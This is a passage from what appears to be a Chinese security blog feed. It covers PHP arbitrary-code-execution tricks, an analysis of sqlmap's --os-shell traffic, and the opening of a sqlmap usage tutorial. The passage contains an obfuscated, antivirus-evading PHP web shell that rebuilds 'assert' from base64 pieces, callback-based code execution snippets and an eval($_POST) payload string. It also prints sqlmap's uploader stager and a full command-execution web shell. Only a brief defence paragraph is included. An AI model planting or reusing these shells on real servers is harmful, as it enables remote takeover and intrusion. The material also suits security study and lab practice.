src="/2021/04/26/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20221026205739067.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$lambda</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$a,$b&#x27;</span>, <span class="hljs-string">&quot;return (strlen(\$a)-strlen(\$b)+&quot;</span> . <span class="hljs-string">&quot;strlen(<span class="hljs-subst">$c</span>));&quot;</span>);<br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;reall long string here,boy&#x27;</span>, <span class="hljs-string">&#x27;this&#x27;</span>, <span class="hljs-string">&#x27;midding lenth&#x27;</span>, <span class="hljs-string">&#x27;larget&#x27;</span>);<br><span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$array</span>, <span class="hljs-variable">$lambda</span>);<br></code></pre></td></tr></table></figure><p><img src="/2021/04/26/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20221026205812563.png"></p><p><strong>小马免杀</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span> [ <span class="hljs-string">&#x27;data&#x27;</span> ];<br><span class="hljs-variable">$fl</span>=<span class="hljs-variable">$a</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mz</span>(<span class="hljs-params"><span class="hljs-variable">$yg</span>,<span class="hljs-variable">$lg</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$yg1</span>=<span class="hljs-title function_ invoke__">Base64_decode</span>(<span class="hljs-variable">$yg</span>);<br>    <span class="hljs-variable">$lg1</span>=<span class="hljs-title function_ invoke__">Base64_decode</span>(<span class="hljs-variable">$lg</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$yg1</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$lg1</span>;<br>    <span class="hljs-variable">$z</span> = <span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<br>    <span class="hljs-variable">$rest</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$z</span>, -<span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;asjidehvbuyzzzzzzzzz&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$rest</span>;<br><br>&#125;<br><span class="hljs-variable">$zx1</span>=<span class="hljs-title function_ invoke__">mz</span>(<span class="hljs-string">&#x27;YXM=&#x27;</span>,<span class="hljs-string">&#x27;cw==&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mz1</span>(<span class="hljs-params"><span class="hljs-variable">$yg</span>,<span class="hljs-variable">$lg</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$yg1</span>=<span class="hljs-title function_ invoke__">Base64_decode</span>(<span class="hljs-variable">$yg</span>);<br>    <span class="hljs-variable">$lg1</span>=<span class="hljs-title function_ invoke__">Base64_decode</span>(<span class="hljs-variable">$lg</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$yg1</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$lg1</span>;<br>    <span class="hljs-variable">$z</span> = <span class="hljs-string">&#x27;adnnytdydvufttvbvftfuf&#x27;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<br>    <span class="hljs-variable">$rest</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$z</span>, -<span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;asjidehvsjfjbvycbuyrdgfhjdbvhgfhgjhbuyzzzzzzzzz&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$rest</span>;<br><br>&#125;<br><span class="hljs-variable">$zx2</span>=<span class="hljs-title function_ invoke__">mz1</span>(<span class="hljs-string">&#x27;ZQ==&#x27;</span>,<span class="hljs-string">&#x27;cnQ=&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fin</span>(<span class="hljs-params"><span class="hljs-variable">$y</span>,<span class="hljs-variable">$l</span></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;asjidehvsjfjbvycbu258888r8rdusuhfyyyrdgfhjdbvhgfhgjhbuyzzzzzzzzz&#x27;</span>;<br>    <span class="hljs-variable">$set</span>=<span class="hljs-string">&#x27;naduuuuuuuuuuuuuuuuudgggggggggggggggjsshhdett&#x27;</span>.<span class="hljs-variable">$y</span>.<span class="hljs-variable">$l</span>;<br>    <span class="hljs-variable">$rest</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$set</span>, -<span class="hljs-number">6</span>, <span class="hljs-number">6</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$rest</span>;<br>&#125;<br><span class="hljs-variable">$zz</span>=<span class="hljs-string">&#x27;bGhkdXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dQ==&#x27;</span>.<span class="hljs-title function_ invoke__">fin</span>(<span class="hljs-variable">$zx1</span>,<span class="hljs-variable">$zx2</span>);<br><span class="hljs-variable">$rest</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$zz</span>, -<span class="hljs-number">6</span>, <span class="hljs-number">6</span>);<br><span class="hljs-comment">//class Fu&#123;</span><br><span class="hljs-comment">//    public $value;</span><br><span class="hljs-comment">//    public $key;</span><br><span class="hljs-comment">//    public function __construct($key,$value)&#123;</span><br><span class="hljs-comment">//        echo $key($value);</span><br><span class="hljs-comment">//    &#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//$sl=new Fu($rest,$fl);</span><br><span class="hljs-variable">$arry</span>=[];<br><span class="hljs-title function_ invoke__">Array_push</span>(<span class="hljs-variable">$arry</span>,<span class="hljs-variable">$rest</span>);<br><span class="hljs-title function_ invoke__">Array_push</span>(<span class="hljs-variable">$arry</span>,<span class="hljs-string">&#x27;qw&#x27;</span>);<br><span class="hljs-title function_ invoke__">Array_push</span>(<span class="hljs-variable">$arry</span>,<span class="hljs-string">&#x27;gvbdj&#x27;</span>);<br><span class="hljs-title function_ invoke__">Array_push</span>(<span class="hljs-variable">$arry</span>,<span class="hljs-variable">$fl</span>);<br><span class="hljs-title function_ invoke__">Array_push</span>(<span class="hljs-variable">$arry</span>,<span class="hljs-string">&#x27;qw&#x27;</span>);<br><span class="hljs-title function_ invoke__">Array_push</span>(<span class="hljs-variable">$arry</span>,<span class="hljs-string">&#x27;gvbdj&#x27;</span>);<br><span class="hljs-variable">$arry</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$arry</span>[<span class="hljs-number">3</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>array_map()命令執行利用函數</p><p><img src="/2021/04/26/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20221026205948467.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-number">0</span>] = <span class="hljs-variable">$cmd</span>;<br><span class="hljs-variable">$new_array</span> = <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$new_array</span>;<br><span class="hljs-comment">//一定要是个回调函数</span><br>回调函数有那些:assert ,create_function<br><br><span class="hljs-comment">//eval是一个语言构造器，而不是一个函数，不能被可变函数调用；</span><br></code></pre></td></tr></table></figure><p>call_user_func()函数 也是适用于回调函数assert create_function()</p><p>array_filter()也是一个可以執行命令的回调函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> <span class="hljs-variable">$array</span>[<span class="hljs-number">0</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br> <span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-variable">$array</span>,<span class="hljs-string">&#x27;assert&#x27;</span>);<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>usort 排序 命令执行函数</p><p><img src="/2021/04/26/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20221026210115095.png"></p><p><img src="/2021/04/26/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20221026210141013.png"></p><p>uasort(<em>array,myfunction</em>);</p><p><strong>一样的,必须传一个数组,因为要排序,所以必须要传两个值以上.</strong></p><p><strong>?1[]&#x3D;1-1&amp;1[]&#x3D;eval($_POST[‘x’])&amp;2&#x3D;assert</strong></p><p><strong>…$_get表示不限制参数个数,参数的名字只能是是数字</strong></p><p><img src="/2021/04/26/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20221026210211273.png"></p><p>任意代码执行的防御手法:</p><p>对于eval()等函数一定要保证用户不能轻易解除eval或者其它代码执行的参数或职责正则严格(preg_replace&#x2F;e)判断输入的数据格式</p><p>对于字符串一定要使用单引号包裹可控代码,并且恰如前进行addslashes()</p><p>对于preeg_replace放弃使用e修饰符.如果必须使用e修饰符,请保证第二个参数中,对于和正则匹配出的对象,用单引号包裹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">**单引号里面的东西不能执行. 但是<span class="hljs-built_in">eval</span>可以执行字符串.<span class="hljs-variable">$&#123;xxx&#125;</span>优先执行xxx,而不是把xxx当成字符串**<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>外网知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap流量分析</title>
    <link href="/2021/02/01/sqlmap1/"/>
    <url>/2021/02/01/sqlmap1/</url>
    
    <content type="html"><![CDATA[<p>十、使用shell命令:<br>参数–os-shell(分析一下)<br>前提:需要网站的物理路径，其次是需要有FIILE权限。<br>sqlmap -r“C:\sqlmap\request.txt” -p id –dms mysql –os-shell</p><p>接下来指定网站可写日录:<br>“C: \www”<br>d: \phpstudy \www(成功)</p><p>以印度朋友写的靶场开搞</p><p><a href="http://www.sql.com/Less-1/?id=1">http://www.sql.com/Less-1/?id=1</a></p><p>平常我们直接上马可能会被过滤掉后缀禁止上传，那如果我们也想sqlmap一样，先上传一个具有上传功能的文件，然后再继续上传马子就不会有黑名单拦截。</p><p>现在就可以看看sqlmap是怎么操作的了</p><p>在进行之前，先判断是否为管理员，以防写不进去</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> ./sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://www.sql.com/Less-1/?id=1&quot;</span> --<span class="hljs-keyword">is</span>-dba<br></code></pre></td></tr></table></figure><p>具备写文件的条件之一</p><p><img src="/2021/02/01/sqlmap1/image-20221023194902258.png"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> ./sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://www.sql.com/Less-1/?id=1&quot;</span> --os-<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><p>第一步先让你选择什么类型的网站1，第二部让你选写入什么类型的马</p><p>假如我们有网站的绝对路径</p><p>注意哈：我们只能在当前文件夹操作，因为我们并没有操作其他文件夹的权限</p><p><img src="/2021/02/01/sqlmap1/image-20221023200811003.png"></p><p><img src="/2021/02/01/sqlmap1/image-20221023200939871.png"></p><p>进行burpsuite抓包分析</p><p><img src="/2021/02/01/sqlmap1/image-20221023202716803.png"></p><p><img src="/2021/02/01/sqlmap1/image-20221023202827472.png"></p><p>这是第一个写入服务器的文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;upload&quot;</span>]))&#123;<span class="hljs-comment">//判断是否有文件上传，如果没有输出类似于文件上传功能的html页面</span><br>    <span class="hljs-variable">$dir</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;uploadDir&quot;</span>];<span class="hljs-comment">//这些参数在注入之前我们已经填充过了</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">phpversion</span>()&lt;<span class="hljs-string">&#x27;4.1.0&#x27;</span>)&#123; <span class="hljs-comment">//判断什么版本</span><br>        <span class="hljs-variable">$file</span>=<span class="hljs-variable">$HTTP_POST_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>】[<span class="hljs-string">&quot;name&quot;</span>];<br>           @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$HTTP_POST_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-variable">$dir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>();<br>                               &#125;<span class="hljs-keyword">else</span>&#123;<br>                                   <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>                                   @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-variable">$dir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>();<br>                                   &#125;<br>     @<span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file</span>,<span class="hljs-number">0755</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File uploaded&quot;</span>; <span class="hljs-comment">//修改文件夹权限</span><br>   &#125;<span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;form action=&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;PHP_SELF&quot;</span>].<span class="hljs-string">&quot; method=POST enctype=multipart/form-data&gt;</span><br><span class="hljs-string">           &lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;</span><br><span class="hljs-string">           &lt;b&gt;sqlmap file uploader&lt;/b&gt;</span><br><span class="hljs-string">           &lt;br&gt;</span><br><span class="hljs-string">           &lt;input name=file type=file&gt;</span><br><span class="hljs-string">           &lt;br&gt;</span><br><span class="hljs-string">           to directory: &lt;input type=text name=uploadDir value=\\&#x27;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-1&#x27;\\&gt; </span><br><span class="hljs-string">           &lt;input type=submit name=upload value=upload&gt;</span><br><span class="hljs-string">           &lt;/form&gt;&quot;</span>;<br>                               &#125;<br>                               <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第二个数据包才是正真上传马子的数据</p><p><img src="/2021/02/01/sqlmap1/image-20221023214458906.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]; <span class="hljs-comment">//通过前期上传的文件上传php上传马子</span><br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;max_execution_time&quot;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$z</span>=@<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&quot;disable_functions&quot;</span>); <span class="hljs-comment">//php.ini配置文件中被禁用掉的命令执行函数</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$z</span>))&#123;<br>    <span class="hljs-variable">$z</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[, ]+/&quot;</span>,<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$z</span>);<br>    <span class="hljs-variable">$z</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$z</span>);<br>    <span class="hljs-variable">$z</span>=<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&quot;trim&quot;</span>,<span class="hljs-variable">$z</span>); <span class="hljs-comment">//如果有被禁用的函数，则转进一个数组里面</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$z</span>=<span class="hljs-keyword">array</span>();&#125;<span class="hljs-variable">$c</span>=<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; 2&gt;&amp;1\n&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"><span class="hljs-variable">$n</span></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$z</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$n</span>)<span class="hljs-keyword">and</span>!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$n</span>,<span class="hljs-variable">$z</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;system&quot;</span>))&#123;<span class="hljs-comment">//调用f()函数，看1是否在禁用名单内，如果不在，用这个命令执行函数来执行用户传入的cmd（命令）</span><br>    <span class="hljs-title function_ invoke__">ob_start</span>();<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">ob_get_clean</span>();<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;proc_open&quot;</span>))&#123;<br>    <span class="hljs-variable">$y</span>=<span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$c</span>,<span class="hljs-keyword">array</span>(<span class="hljs-keyword">array</span>(pipe,r),<span class="hljs-keyword">array</span>(pipe,w),<span class="hljs-keyword">array</span>(pipe,w)),<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$t</span>[<span class="hljs-number">1</span>]))&#123;<br>        <span class="hljs-variable">$w</span>.=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$t</span>[<span class="hljs-number">1</span>],<span class="hljs-number">512</span>);<br>    &#125;@<span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$y</span>);<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;shell_exec&quot;</span>))&#123;<br>    <span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;passthru&quot;</span>))&#123;<br>    <span class="hljs-title function_ invoke__">ob_start</span>();<br>    <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">ob_get_clean</span>();<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;popen&quot;</span>))&#123;<br>    <span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$c</span>,r);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$x</span>))&#123;<span class="hljs-variable">$w</span>.=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$x</span>,<span class="hljs-number">512</span>);<br>                        &#125;<br>    &#125;@<span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$x</span>);<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">f</span>(<span class="hljs-string">&quot;exec&quot;</span>))&#123;<br>    <span class="hljs-variable">$w</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$c</span>,<span class="hljs-variable">$w</span>);<br>    <span class="hljs-variable">$w</span>=<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">10</span>),<span class="hljs-variable">$w</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">10</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$w</span>=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$w</span>&lt;/pre&gt;&quot;</span>;<span class="hljs-comment">//回显结果</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>sqlmap流量分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlmap流量分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap的使用</title>
    <link href="/2021/01/28/sql4/"/>
    <url>/2021/01/28/sql4/</url>
    
    <content type="html"><![CDATA[<p>SQLmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。</p><p>支持的数据库:MySQL，Oracle,PostgreSQL,Microsoft SQL’Server,Microsoft Access,IBM DB2,SQLite,Firebird, Sybase andSAP MAXDB。</p><p>sQLmap支持五种不同的注入模式:<br>◆UNION query sQL injection(可联合查询注入)</p><p>◆Error-based sQL injection(报错型注入)<br>◆Boolean-based blind sQL injection(布尔型注入)</p><p>◆Time-based blind sQL injection(基于时间延迟注入）</p><p>◆Stacked queries sQL injection (可多语句查询注入)</p><p>二、设置目标URL</p><p>-u&#x2F;–url<br>最基本格式sqlmap -u”<a href="http://www.target.com/index.php?id=1%E2%80%9D">http://www.target.com/index.php?id=1”</a></p><p>-m<br>从文本中获取多个目标扫描,但是每一行只能有一个ur1.sqlmap-ur1list.txt</p><p>-r<br>从文件中加载HTTP请求，这样的话就不需要在去设定cookie, POST数据……等等。</p><p>三、设置回显等级<br>参数: -v默认为1:<br>0、只显示python错误以及严重的信息。<br>1、同时显示基本信息和警告信息。（默认等级&gt;</p><p>2、同时显示debug信息。<br>3、同时显示注入的payload。</p><p>4、同时显示HTTP请求。</p><p>5、同时显示HTTP响应头。</p><p>6、同时显示HTTP响应页面。</p><p>四、设置HTTP数据包相关参数<br>参数: –data<br>此参数是把data后面的数据以POST方式提交，sqlmap会像检测GET参数一样检测POST提交过去的参数。<br>python sqlmap.py -u “<a href="http://www.target.com/vuln.php&quot;">http://www.target.com/vuln.php&quot;</a> –data&#x3D;”id&#x3D;1”<br>参数: –cookie<br>当web需要登录的时候，需要我们抓包获取cookie参数，然后复制出来，加到–cookie参数中。<br>–cookie&#x3D;” Cookie: Hm_lvt6910067,1546929561,1547001094,1547024662;PHPSESSID&#x3D;o64fbvo316lg59njufl2gfutm4; “</p><p>四、设置HTTP数据包相关参数<br>HTTP User-Agent头参数:–user-agent<br>默认情况下sqlmap的HTTP请求头中的User-Agent值是: sqlmap&#x2F;1.O-dev-xxxxxxxxx(<a href="http://sqlmap.org/">http://sqlmap.org</a>)<br>这个时候可以手动指定伪造一个User-Agent。<br>sqlmap -u “<a href="http://www.target.com”--level/">http://www.target.com”--level</a> 3 –user-agent&#x3D;” aaaaaa” –dbs<br>参数: –random-agent会从&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;txt&#x2F;user-agents.txt中随机产生User-Agent头。<br>sqlmap -u “<a href="http://www.target.com”/">http://www.target.com”</a> –level 3 –random-agent –dbs<br>sqlmap检查uesr-agent中的注入点, level&gt;&#x3D;3才会去检查user-agent头是否存在注入漏洞</p><p>四、设置HTTP数据包相关参数<br>HTTP Referer头<br>参数: 